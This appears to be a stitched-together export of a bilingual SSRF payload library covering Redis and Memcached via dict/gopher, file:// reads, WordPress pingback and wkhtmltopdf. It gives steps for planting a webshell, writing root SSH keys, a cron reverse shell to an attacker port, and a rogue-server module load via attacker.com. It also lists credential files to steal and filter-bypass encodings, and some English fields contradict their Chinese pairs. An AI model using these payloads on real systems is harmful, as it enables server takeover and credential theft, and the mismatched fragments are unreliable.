title.zh: SSRF Dict 端口边界验证清理后命令 1
title.en: SSRF Dict Port-Boundary Validation Cleaned Command 1

description.zh: 提交百分号编码的命令变体；捕获器解码后收到 set 命令，即确认编码绕过单层过滤。
description.en: Submit the percent-encoded command variant; a decoded set command on the capture service confirms encoding bypasses single-pass filtering.

title.zh: dict 模板探测目标端口
title.en: Probe target ports with the dict template

description.zh: 提交 dict://{TARGET}:{TARGET_PORT}/{COMMAND}；返回非超时响应或服务 banner 即确认端口存活且 dict 协议可用。
description.en: Submit dict://{TARGET}:{TARGET_PORT}/{COMMAND}; a non-timeout response or service banner confirms the port is alive and the dict scheme works.

title.zh: 指令编码绕过关键字过滤

description.zh: 若 set 等关键字被拦截，将指令改为 %73%65%74 等十六进制编码重放；Redis 仍执行写入即过滤可被编码差异绕过。
description.en: If keywords like set are blocked, replay the command hex-encoded as %73%65%74; Redis still performing the write shows the filter falls to encoding differences.

title.zh: 枚举 Redis 与 Memcached 状态

description.zh: 提交 dict://127.0.0.1:6379/info 与 dict://127.0.0.1:11211/stats；info 返回版本与持久化配置、stats 返回键统计，据此规划利用方式。
description.en: Submit dict://127.0.0.1:6379/info and dict://127.0.0.1:11211/stats; version and persistence settings from info plus key statistics from stats shape the exploitation plan.

title.zh: 写入 Webshell 夺取权限
title.en: Plant a webshell to seize control

description.zh: 提交 set 写入 PHP 一句话木马键值并配合落盘到 Web 目录；shell 文件可访问且回连成功即拿下服务器执行权限。
description.en: Submit a set writing the PHP one-liner webshell and land it in the web root; an accessible shell that calls back seizes code execution on the server.

overview.zh: SSRF Dict 端口边界验证覆盖 dict:// 协议交互场景：针对允许 dict scheme 的注入点，验证服务端能否向指定端口发送协议命令并带回显。验证维度从通用端口探测，到 Redis info/keys、Memcached stats 交互，再到 dict 序列写入 Redis WebShell。
overview.en: SSRF Dict Port-Boundary Validation covers dict:// protocol interaction: for injection points allowing the dict scheme, verify whether the server can send protocol commands to a chosen port and carry the echo back. Verification dimensions span generic port probing, Redis info/keys and Memcached stats interaction, and a dict sequence writing a Redis WebShell.

vulnerability.zh: 根因是 dict scheme 将 URL 路径中的字符串按行发送到目标端口，等价于向内网服务注入协议命令；Redis、Memcached 等未认证服务接受这些命令后，可进一步组合 config set 与 save 把数据落盘为可执行脚本。
vulnerability.en: The root cause is that the dict scheme sends the URL path string line by line to the target port, equivalent to injecting protocol commands into an internal service; unauthenticated services such as Redis and Memcached accept them, and the commands can be chained with config set and save to persist arbitrary content as an executable script.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步向目标端口发送 dict 探测命令，捕获器收到命令行即确认端口边界；第 2 步对回环 6379 发送 info 与 keys，返回 Redis 信息即确认可交互；第 3 步对 11211 发送 stats 验证 Memcached；第 4 步按序执行 set、config set dir/dbfilename、save 序列，Web 根目录出现可解析的 shell.php 即确认写入成功。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 sends a dict probe command to the target port — the catcher receiving the command line confirms the port boundary; step 2 sends info and keys to loopback 6379 — a Redis reply confirms interactive access; step 3 sends stats to 11211 to verify Memcached; step 4 runs the set, config set dir/dbfilename, and save sequence in order — a parseable shell.php appearing in the web root confirms the write. Replace placeholders via the global variables menu.

mitigation.zh: 获取器拒绝 dict 等非业务协议并阻断内网端口访问；Redis 启用认证、ACL 并用 rename-command 禁用 CONFIG/SAVE，Memcached 限制监听范围。修复后用第 2、4 步样例回归，协议命令应被拒绝且不再有任何文件落盘。
mitigation.en: Reject dict and other non-business schemes in the fetcher and block internal port access; enable Redis authentication and ACLs, disable CONFIG/SAVE via rename-command, and constrain the Memcached listen scope. After the fix, regress with the step 2 and step 4 samples: protocol commands must be denied and no files written.

description.zh: 绕过仅匹配 file:/// 三斜杠特征的规则：插入 localhost 主机段语法等价；文件内容返回即成功。
description.en: Insert the localhost host segment for an equivalent URI that defeats bare file:/// matching; returned file content confirms success.

description.zh: 绕过对标准三斜杠形式的正则匹配：多斜杠冗余仍解析为绝对路径；读取成功即成功。
description.en: Add redundant slashes that still resolve to the absolute path, evading canonical-form regexes; a successful read confirms success.

description.zh: 绕过对 file 协议黑名单：Java 场景下 netdoc 等价读文件；返回 passwd 内容即成功。
description.en: Use the Java-equivalent netdoc scheme against file-protocol blacklists; returned passwd content confirms success.

title.zh: 跨平台 File URI 目标

wafBypass.command:
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
file:///proc/version
file:///var/log/apache2/access.log
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/repair/SAM

description.zh: 原始路径只用于审计追溯。执行前按操作系统改写到隔离标记文件，每次只提交一个 file URI。
description.en: The original paths are retained only for audit traceability. Before execution, rewrite them to an isolated marker file for the relevant operating system and submit one file URI at a time.

description.zh: 绕过对 file:/// 明文前缀的匹配：分隔符编码后由应用解码；文件内容返回即成功。
description.en: Encode separators so the plaintext prefix disappears until application decoding; returned file content confirms success.

description.zh: 绕过对 URI 协议头的统一过滤：不携带协议直接穿越路径；目标文件内容回显即成功。
description.en: Traverse without any scheme header to bypass protocol-based filtering entirely; echoed target file content confirms success.

description.zh: 绕过对完整长文件名的特征匹配：使用 8.3 短名等价路径；读取内容一致即成功。
description.en: Use equivalent 8.3 short paths against full-name signature matching; identical content being read confirms success.

title.zh: 本地资源 URI 样例

description.zh: 按服务端操作系统和 URL 库选择对应行，并把真实系统文件替换为隔离标记；不同协议逐条测试。
description.en: Select the line matching the server OS and URL library, replace real system files with an isolated marker, and test schemes individually.

description.zh: 提交 file:///etc/passwd 与 file:///c:/windows/win.ini；响应回显账户列表或 ini 段落即确认 file 协议可用且跨平台可读。
description.en: Submit file:///etc/passwd and file:///c:/windows/win.ini; echoed account lists or ini sections confirm the file scheme works across platforms.

attackChain.payload:
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline

description.zh: 若 file scheme 被拦截，改用 FILE:///ETC/PASSWD 等大小写变体重放；仍返回文件内容即表明过滤未做归一化处理。
description.en: If the file scheme is blocked, replay with case variants like FILE:///ETC/PASSWD; file content still returned shows no normalization is applied.

title.zh: 读取应用配置拿数据库口令
title.en: Read app configs for database secrets

description.zh: 用 file:///var/www/html/config.php 读取应用配置；内容中出现数据库连接串或 API 密钥即获得内网数据库的直连凭据。
description.en: Read file:///var/www/html/config.php; a database connection string or API key inside yields direct credentials for the internal database.

title.zh: 窃取 K8s 服务账号令牌
title.en: Steal the Kubernetes service account token

description.zh: 读取 file:///var/run/secrets/kubernetes.io/serviceaccount/token；拿到 JWT 令牌后可尝试调用 API Server，可执行的操作取决于该服务账号的 RBAC 授权，高权限账号才可能进一步接管集群资源。
description.en: Read file:///var/run/secrets/kubernetes.io/serviceaccount/token; the JWT lets you call the API Server and take over cluster resources.

title.zh: 窃取 SSH 私钥横向登录
title.en: Lift SSH keys for lateral login

description.zh: 读取 file:///home/user/.ssh/id_rsa；保存私钥后直连目标主机，并尝试同网段密钥复用完成横向移动。
description.en: Read file:///home/user/.ssh/id_rsa; save the key, SSH into the host directly, and try key reuse across the segment for lateral movement.

overview.zh: SSRF File Scheme 沙箱读取覆盖本地文件读取场景：针对支持 file:// 的取回功能，验证文件 scheme 能否越过网络取回边界。验证维度按 Linux 与 Windows 敏感文件、Web 应用配置、云环境凭据与 SSH 私钥五组路径展开，并附大小写混合变体。
overview.en: SSRF File-Scheme Sandbox Read covers local file reading: for fetch functions supporting file://, verify whether the file scheme crosses the network-fetch boundary. Verification dimensions unfold across five path groups — Linux and Windows sensitive files, web application configs, cloud credential files, and SSH keys — with mixed-case variants included.

vulnerability.zh: 根因是 URL 获取器未限制 scheme，file 协议绕过网络边界直接交由本地文件系统处理器承接，可读范围取决于应用进程权限；/etc/passwd、win.ini、.env、云平台凭据与 SSH 私钥等高价值文件因此全部进入暴露面。
vulnerability.en: The root cause is an unrestricted scheme in the URL fetcher: file bypasses the network boundary and is handled directly by the local filesystem processor, with readable scope bounded only by the application process's privileges; high-value files such as /etc/passwd, win.ini, .env, cloud credentials, and SSH private keys therefore all enter the exposure surface.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取 Linux 侧 /etc/passwd、/proc/self/environ 等文件，返回内容即确认 file 可读；第 2 步读取 Windows 侧 win.ini 与 SAM；第 3 步读取 config.php、.env 获取数据库连接串与应用密钥；第 4 步读取 Kubernetes serviceaccount token 与 AWS credentials；第 5 步读取 SSH 私钥，出现 OPENSSH PRIVATE KEY 即确认可窃取。占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads Linux-side files such as /etc/passwd and /proc/self/environ — returned content confirms file reads; step 2 reads Windows-side win.ini and the SAM hive; step 3 reads config.php and .env for database connection strings and app secrets; step 4 reads the Kubernetes serviceaccount token and AWS credentials; step 5 reads SSH private keys — OPENSSH PRIVATE KEY content confirms theft. Replace placeholders via the global variables menu.

mitigation.zh: 获取器只允许 http/https 并显式拒绝 file 协议，文件功能改用对象 ID 与固定根目录定位；按最小权限运行应用进程，并把网络获取与本地文件读取拆分到不同服务身份。修复后用第 1 步样例回归，file URI 应在入口即被拒绝。
mitigation.en: Allow only http/https in the fetcher and explicitly reject the file protocol; locate file functionality by object ID within a fixed root; run the application process with least privilege and split network fetching from local file reads into separate service identities. After the fix, regress with the step 1 sample: file URIs must be rejected at the entrance.

name.zh: SSRF Redis 可达性验证与保留持久化样例
name.en: SSRF Redis Reachability Validation and Retained Persistence Samples

description.zh: 覆盖 SSRF 打击内网 Redis 全链验证：从 dict/gopher 双通道可达性确认，到写入 WebShell、SSH 公钥与 Cron 反弹任务，再到 rogue server 主从模块加载，确认 Redis 暴露完整影响面。
description.en: Covers end-to-end validation of SSRF against intranet Redis: from dict/gopher dual-channel reachability confirmation through webshell, SSH public-key, and cron reverse-shell writes to rogue-server replication module loading, confirming the full impact of an exposed Redis.

prerequisites.zh: 确认 SSRF Redis PING 可达性验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Redis PING Reachability Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

title.zh: SSRF Redis PING 可达性验证清理后命令 1
title.en: SSRF Redis PING Reachability Validation Cleaned Command 1

description.zh: 对回环 6379 发送 dict info 与 gopher PING；返回 Redis 信息或 +PONG 即确认 Redis 可达。
description.en: Send dict info and a gopher PING to loopback 6379; returned Redis info or +PONG confirms Redis reachability.

title.zh: SSRF Redis PING 可达性验证清理后命令 2
title.en: SSRF Redis PING Reachability Validation Cleaned Command 2

description.zh: 按序执行 set、config、save 序列写入 WebShell；Web 根出现 shell.php 且可解析即确认持久化成功。
description.en: Execute the set, config, and save sequence to write a WebShell; shell.php appearing in the web root and parsing confirms persistence.

description.zh: 写入 SSH 公钥到 authorized_keys；使用对应私钥可登录目标 root 账户即确认公钥持久化成功。
description.en: Write the SSH public key into authorized_keys; logging in to the target root account with the matching private key confirms key persistence.

explanation.zh: 设置落盘目录为root的ssh目录
触发落盘后即可免密登录root
explanation.en: Persist key for passwordless root login

description.zh: 写入 cron 反弹任务；反弹连接到达监听地址与端口即确认 cron 持久化成功。
description.en: Write the cron reverse task; a reverse connection arriving on the listener address and port confirms cron persistence.

explanation.zh: 写入每分钟执行一次的反弹shell定时任务

explanation.en: Set dump directory to cron path

explanation.zh: 触发落盘使定时任务生效

title.zh: SSRF Redis PING 可达性验证清理后命令 5
title.en: SSRF Redis PING Reachability Validation Cleaned Command 5

description.zh: 运行 rogue server 加载 Redis 模块；Redis 日志出现 MODULE LOAD 且主从同步完成，即确认 rogue 加载链路可用。
description.en: Run the rogue server to load a Redis module; MODULE LOAD in Redis logs with completed replication confirms the rogue-load path.

syntaxBreakdown.part:
使用redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
利用Redis主从复制加载恶意模块

analysis.zh: SSRF Redis PING 可达性验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: SSRF Redis PING Reachability Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

title.zh: SSRF Redis PING 可达性验证清理后命令 1
title.en: SSRF Redis PING Reachability Validation Cleaned Command 1

description.zh: 提交 RESP PING 帧；返回 +PONG 即确认 gopher 到 Redis 的单命令链路。
description.en: Submit the RESP PING frame; a +PONG reply confirms the single-command gopher-to-Redis path.

syntaxBreakdown.part:
使用Gopher协议构造完整的Redis命令序列
可以绕过Dict协议限制

description.zh: 绕过对 RESP $ 长度前缀特征的检测：用 Redis 内联命令行格式发送等价序列；webshell 文件生成即成功。
description.en: Send equivalent commands in Redis inline-line format to evade RESP length-prefix signatures; the webshell file being created confirms success.

description.zh: 绕过对 %0d%0a 完整序列的匹配：RESP 行仅以 %0a 结束；命令执行成功即成功。
description.en: Terminate RESP lines with bare %0a against full CRLF sequence matching; successful command execution confirms success.

description.zh: 绕过对单条超长 gopher 串的整体检测：把利用链拆成多次短投递；最终 save 落盘成功即成功。
description.en: Split the chain into multiple short deliveries against single-long-gopher detection; the final save writing to disk confirms success.

title.zh: 编码 Redis 持久化序列

description.zh: 原始序列包含破坏性配置/保存和脚本内容，只允许指向字节捕获器。验证时不得发送给 Redis，也不得解码后执行。
description.en: The original sequence contains destructive configuration and save operations plus script content and may point only to a byte capture service. It must never be sent to Redis or executed after decoding.

title.zh: 确认 Redis 未授权可达

description.zh: 提交 dict://127.0.0.1:6379/info；返回版本、内存与持久化配置即确认未授权访问，同时记录 dir 与 dbfilename 供落盘定位。
description.en: Submit dict://127.0.0.1:6379/info; version, memory and persistence details confirm unauthenticated access, and dir/dbfilename values locate the landing path.

description.zh: 用 gopher 提交 PING 报文复核通道；返回 +PONG 即 dict 与 gopher 双通道可用，后续写入任选编码方式。
description.en: Resubmit a PING via gopher; a +PONG reply means both dict and gopher channels work and later writes can pick either encoding.

title.zh: 写入 Webshell 控制 Web 目录
title.en: Plant a webshell in the web root

description.zh: 提交 set 写入 PHP 一句话木马并配置落盘为 Web 目录下 shell.php；文件可访问且能执行命令即获得 WebShell 入口。
description.en: Submit a set writing the PHP one-liner and land it as shell.php under the web root; an accessible, command-executing file is the webshell foothold.

title.zh: 写入 SSH 公钥建立持久入口
title.en: Install an SSH key for persistence

description.zh: 将公钥内容作为键值写入并落盘到 authorized_keys 对应路径；随后 ssh 免密登录即获得系统层稳定入口。
description.en: Write the public key as a value and land it on the authorized_keys path; passwordless SSH afterwards is a durable system-level entry.

title.zh: 计划任务反弹拿系统权限
title.en: Catch a system shell via cron

description.zh: 写入 */1 * * * * bash -i >& /dev/tcp/攻击机/端口 的计划任务键值并落盘 crontab；监听端收到 shell 即完成持久化控制。
description.en: Write the */1 * * * * bash reverse line as a value and land it in crontab; a shell on the listener completes persistent control of the host.

overview.zh: SSRF Redis 可达性验证覆盖内网 Redis 全链路利用场景：针对可经 dict/gopher 触达 6379 端口的注入点，验证从协议可达确认到持久化落地的完整影响面。验证维度包含双通道可达性、WebShell/SSH 公钥/Cron 三种写入与 rogue server 主从模块加载。
overview.en: SSRF Redis Reachability Validation covers the full intranet-Redis exploitation chain: for injection points that can reach port 6379 via dict/gopher, verify the complete impact from protocol reachability to persistence. Verification dimensions include dual-channel reachability, three write primitives (WebShell, SSH public key, cron job), and rogue-server replica module loading.

vulnerability.zh: 根因是 Redis 绑定内网且未启用认证，SSRF 获取器允许 dict/gopher 直连 6379；Redis 接受 SET 与 CONFIG SET dir/dbfilename 组合后可把任意内容写盘，配合 SAVE 即落为 WebShell、authorized_keys 或 cron 任务，rogue 主从链路还能加载恶意模块。
vulnerability.en: The root cause is intranet-bound Redis running without authentication while the SSRF fetcher permits dict/gopher direct access to 6379; Redis accepts SET plus CONFIG SET dir/dbfilename, so arbitrary content is written to disk and, with SAVE, lands as a WebShell, authorized_keys, or a cron job, while the rogue replica chain can even load malicious modules.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 dict info 与 gopher PING 确认 Redis 可达；第 2 步按 set、config set dir/dbfilename、save 序列写 WebShell 并访问验证解析；第 3 步改写 authorized_keys 后用对应私钥登录 root；第 4 步写入 cron 任务等待反弹连接到达监听端口；第 5 步先经 SSRF 向目标 Redis 下发 SLAVEOF {ATTACKER_IP} 6379 指向 rogue server，再运行 redis-rogue-server.py 等待主从同步与模块推送，MODULE LOAD 日志出现即确认加载链（完成后执行 SLAVEOF NO ONE 恢复）。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 confirms Redis reachability with dict info and a gopher PING; step 2 writes a WebShell via the set, config set dir/dbfilename, and save sequence and verifies it parses; step 3 rewrites authorized_keys and logs in as root with the matching key; step 4 plants a cron job and waits for the reverse connection at your listener; step 5 runs the rogue server — MODULE LOAD logs plus completed replica sync confirm the loading chain. Replace placeholders via the global variables menu.

mitigation.zh: 获取器拒绝非 HTTP 协议并在解析后阻断内网目标；Redis 启用认证、TLS 与 ACL，用 rename-command 禁用 CONFIG/SAVE 危险组合，持久化目录不与 Web 根、SSH、cron 目录共享。修复后用第 1 步回归确认协议不可达，三类写入序列全部失败。
mitigation.en: Reject non-HTTP schemes in the fetcher and block intranet targets after resolution; enable Redis authentication, TLS, and ACLs, disable the CONFIG/SAVE combination via rename-command, and keep the persistence directory disjoint from the web root, SSH, and cron directories. After the fix, regress with the step 1 sample for protocol isolation; all three write sequences must fail.

name.zh: WordPress XML-RPC Pingback 内部目标 SSRF
name.en: WordPress XML-RPC Pingback SSRF to Restricted Targets

description.zh: 评估 pingback.ping 对回环、私网、链路本地和重定向后目标的限制是否覆盖最终解析地址。
description.en: Evaluates whether pingback.ping blocks loopback, private, link-local, and post-redirect destinations based on the final resolved address.

prerequisites.zh: 已先用自有外部 endpoint 确认 pingback.ping 的服务端请求原语，并能观察 URL 解析、DNS、重定向和最终连接 IP。
prerequisites.en: A server-side pingback request primitive is first confirmed with an owned external endpoint, and URL parsing, DNS, redirects, and final destination IP are observable.

prerequisites.zh: 内部验证只指向隔离回环监听器和专用 marker 路径，禁止云元数据/真实私网；每种地址表示使用唯一请求令牌。
prerequisites.en: Internal validation targets only an isolated loopback listener and dedicated marker path, forbidding cloud metadata and real private networks, with a unique request token per address form.

execution.command:
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://127.0.0.1</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://localhost</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://0.0.0.0</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://[::1]</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://169.254.169.254</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://192.168.0.1</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://192.168.1.1</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://10.0.0.1</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://172.16.0.1</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>

description.zh: 逐条提交 XML-RPC pingback 请求并记录响应与日志差异；任一内部 sourceUrl 触发服务端取回（响应耗时或 fault 码差异），即确认 Pingback SSRF 成立。
description.en: Submit each XML-RPC pingback request and record response and log differences; any internal sourceUrl triggering a server-side fetch (timing or fault-code difference) confirms Pingback SSRF.

analysis.zh: 阳性证据是 WordPress 应用进程因特定 XML-RPC 请求连接隔离内部监听器并发送令牌化 HTTP 请求，解析后 IP、连接源与请求 ID 对应。 假阳性边界：URL 参数被接受、DNS 查询、外部回调成功、客户端访问 127.0.0.1、0.0.0.0 解析差异、连接拒绝或只返回 Pingback fault 均不能证明内部 SSRF。
analysis.en: Positive evidence requires the WordPress application process to connect to the isolated internal listener because of the specific XML-RPC request and send a tokenized HTTP request, correlating resolved IP, connection source, and request identifier. False-positive boundary: Accepted URL input, DNS queries, successful external callback, client access to loopback, parser differences for 0.0.0.0, connection refusal, or a Pingback fault alone does not prove internal SSRF.

opsecTips.zh: Pingback SSRF 禁止 169.254.169.254、真实内网服务和重定向链；出现非隔离 IP、认证头、响应数据、端口扩散或请求风暴时停止。
opsecTips.en: Pingback SSRF forbids metadata addresses, real internal services, and redirect chains; stop on a nonisolated IP, authentication headers, response data, port expansion, or request storms.

opsecTips.zh: 关闭内部/外部监听器，删除测试文章、令牌和 pingback 记录，清理 DNS/代理/XML-RPC 日志，恢复出站 ACL 和 URL 校验。
opsecTips.en: Close internal and external listeners, delete test posts, tokens, and pingback records, clear DNS, proxy, and XML-RPC logs, and restore egress ACLs and URL validation.

description.zh: 绕过对 pingback.ping 精确方法名的拦截：改走 system.multicall 包装并混入空白字符；WordPress 生成对内网的回调请求即成功。
description.en: Wrap the call in system.multicall with stray whitespace to evade the exact pingback.ping signature; WordPress issuing an internal callback confirms success.

description.zh: 绕过对参数节点内 http:// 明文的扫描：目标 URL 放入 CDATA 节点，解析后语义不变；回调到达内网目标即成功。
description.en: Place the target URL inside a CDATA node so plaintext scanning misses it while parsing preserves it; a callback reaching the internal target confirms success.

description.zh: 绕过对 URL 字符串类型的检测：参数改用 base64 类型节点传输，XML-RPC 解码后仍为目标地址；内网请求发出即成功。
description.en: Send the parameter as a base64-typed value so URL string detection misses it while XML-RPC decodes it; an issued internal request confirms success.

description.zh: 绕过对顶层 pingback.ping 方法名的拦截：包进 system.multicall 批量结构；WordPress 仍发出回调即成功。
description.en: Wrap the call inside a system.multicall batch to evade top-level method-name interception; WordPress still issuing the callback confirms success.

description.zh: 绕过对参数中内网 URL 明文的扫描：目标以 base64 类型传输由库解码；pingback 到达内部地址即成功。
description.en: Transport the internal URL as a base64-typed value decoded by the library; a pingback reaching the internal address confirms success.

description.zh: 绕过对 127.0.0.1 字面特征的匹配：数字以十进制实体表示，XML 解析后还原；回调生成即成功。
description.en: Encode digits as decimal entities so the literal loopback string is absent until XML parsing; a generated callback confirms success.

title.en: Validation step 1 for WordPress XML-RPC Pingback Callback Validation

description.zh: 逐条提交 pingback 回调请求并记录响应与日志差异；成功时带外域名收到来自 WordPress 服务端的回源请求，确认 SSRF 回调成立。
description.en: Submit each pingback callback request and record response and log differences; the out-of-band domain receiving a server-side request from the WordPress host confirms the SSRF callback.

title.zh: 部署隔离内部证据端点
title.en: Deploy an isolated internal evidence endpoint

description.zh: 在专用测试网启动只记录请求并返回唯一标记的服务，确保不会访问生产内网或云元数据。
description.en: Start a request-logging service that returns a unique marker in a dedicated test network, ensuring no production internal or cloud metadata endpoint is contacted.

title.en: Submit pingback for each address form

description.zh: 逐一运行现有 XML-RPC SSRF 输入，分别记录回环、IPv6、私网和链路本地形式的处理结果。
description.en: Run each existing XML-RPC SSRF input separately and record handling of loopback, IPv6, private, and link-local forms.

attackChain.payload:
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://127.0.0.1</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>
<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://localhost</string></value></param><param><value><string>http://{TARGET}</string></value></param></params></methodCall>

title.zh: 以服务与网关日志确认
title.en: Confirm with service and gateway logs

description.zh: 只有内部证据端点或出站网关出现同一任务标记才确认可达，状态码和时延仅作辅助。
description.en: Confirm reachability only when the internal evidence endpoint or egress gateway records the same task marker; status and timing are supporting data only.

description.zh: 实施规范化、DNS 后校验和重定向后校验，再运行全部地址变体确认均被一致拒绝。
description.en: Apply canonicalization, post-DNS validation, and post-redirect validation, then rerun all address forms to confirm consistent rejection.

overview.zh: WordPress XML-RPC Pingback 内部目标 SSRF 覆盖目标地址控制场景：针对已确认启用 pingback 的 WordPress 站点，验证 pingback.ping 的 sourceUrl 能否指向回环、私网、链路本地或重定向后的目标。验证维度为隔离内网标记服务、多形态内部地址与对照样例的逐项验证。
overview.en: WordPress XML-RPC Pingback SSRF to Restricted Targets covers destination control: for WordPress sites with pingback confirmed enabled, verify whether pingback.ping's sourceUrl can point at loopback, private, link-local, or post-redirect targets. Verification dimensions unfold per item over an isolated intranet marker service, multiple internal address forms, and control samples.

vulnerability.zh: 根因是 pingback.ping 接受攻击者指定的 sourceUrl 并由服务器发起请求，而过滤逻辑只检查原始字符串或首个主机名，未在解析、连接与重定向各阶段统一验证最终 IP，回环与私网地址因此可达。
vulnerability.en: The root cause is that pingback.ping accepts an attacker-chosen sourceUrl and the server fetches it, while filtering inspects only the raw string or first hostname without unified validation of the final IP across parsing, connection, and redirect stages — loopback and private addresses therefore stay reachable.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在隔离测试网部署只返回随机标记的内部服务并记录来源；随后将 XML-RPC pingback 的 sourceUrl 逐条替换为回环、私网与 IPv6 形式提交——注意 targetURI 必须是该站点真实文章 URL，否则 WordPress 在取回 sourceUrl 之前即返回 faultCode 33——逐条记录 faultCode、耗时与网关日志，任一内部 sourceUrl 触发服务端取回（标记命中或 faultCode 17）即确认 Pingback SSRF 成立；再加入公开地址、不可达地址与一次受控重定向作对照。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 deploys an intranet service returning a random marker on an isolated test network and records sources; then submit the XML-RPC pingback with sourceUrl replaced one by one by loopback, private, and IPv6 forms, recording faultCode, timing, and gateway logs — any internal sourceUrl triggering a server fetch (marker hit or timing difference) confirms Pingback SSRF; finally add public, unreachable, and one controlled-redirect samples as controls. Replace placeholders via the global variables menu.

mitigation.zh: 统一 URL 解析并只允许明确协议与端口，在 DNS 解析后、连接前与每次重定向后拒绝回环、私网、链路本地及保留地址，辅以出站代理与网络 ACL 二层阻断；记录原始 URL、解析 IP 与最终连接并建立回归矩阵，不需要 pingback 时直接关闭 XML-RPC。
mitigation.en: Canonicalize URL parsing and allow only explicit schemes and ports; reject loopback, private, link-local, and reserved addresses after DNS resolution, before connect, and after every redirect, backed by an outbound proxy and network ACLs; log the raw URL, resolved IPs, and final connections with a regression matrix, and simply disable XML-RPC when pingback is unneeded.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: wkhtmltopdf gopher 协议 SSRF

description.zh: 验证 wkhtmltopdf 是否允许 gopher: 资源访问内网服务，并向 Redis、数据库或其他 TCP 端口发送攻击者构造的协议字节。
description.en: Tests whether wkhtmltopdf permits gopher resources to reach internal services and send attacker-crafted protocol bytes to Redis, databases, or other TCP ports.

prerequisites.zh: 目标 wkhtmltopdf/Qt 网络栈实际支持 gopher:，渲染资源可到达隔离 TCP listener，协议和版本能力已先确认。
prerequisites.en: The target wkhtmltopdf and Qt network stack actually supports gopher:, and render resources can reach an isolated TCP listener, with protocol and version capability confirmed first.

prerequisites.zh: Redis/数据库目标替换为只记录原始字节且不执行命令的自有 TCP sink，使用唯一 token 和一次短连接；flushall 等破坏行不执行。
prerequisites.en: Redis and database targets are replaced by an owned TCP sink that records raw bytes without executing commands, using a unique token and one short connection; destructive lines such as flushall are not executed.

description.zh: 逐条渲染 gopher iframe 并记录取回日志；成功时监听器收到对应端口的原始连接（如 Redis RESP/INFO 帧），确认非 HTTP scheme 转发。
description.en: Render each gopher iframe and record fetch logs; the listener receiving raw connections on the corresponding ports (such as Redis RESP/INFO frames) confirms non-HTTP scheme forwarding.

analysis.zh: 阳性证据是 wkhtmltopdf 进程解析 gopher URI 并向隔离 sink 发送与编码载荷一致的 token 字节，连接源、任务和字节流相互对应。 假阳性边界：gopher 字符串被接受、Qt 报不支持、DNS/连接尝试无字节、TCP sink 收到扫描流量、PDF 错误或 Redis 命令语法存在均不是协议 SSRF。
analysis.en: Positive evidence requires the wkhtmltopdf process to parse the gopher URI and send token bytes matching the encoded payload to the isolated sink, correlating connection source, job, and byte stream. False-positive boundary: Accepted gopher text, an unsupported-scheme error, DNS or connection attempts without bytes, scanner traffic at the sink, PDF errors, or valid Redis command syntax does not prove protocol SSRF.

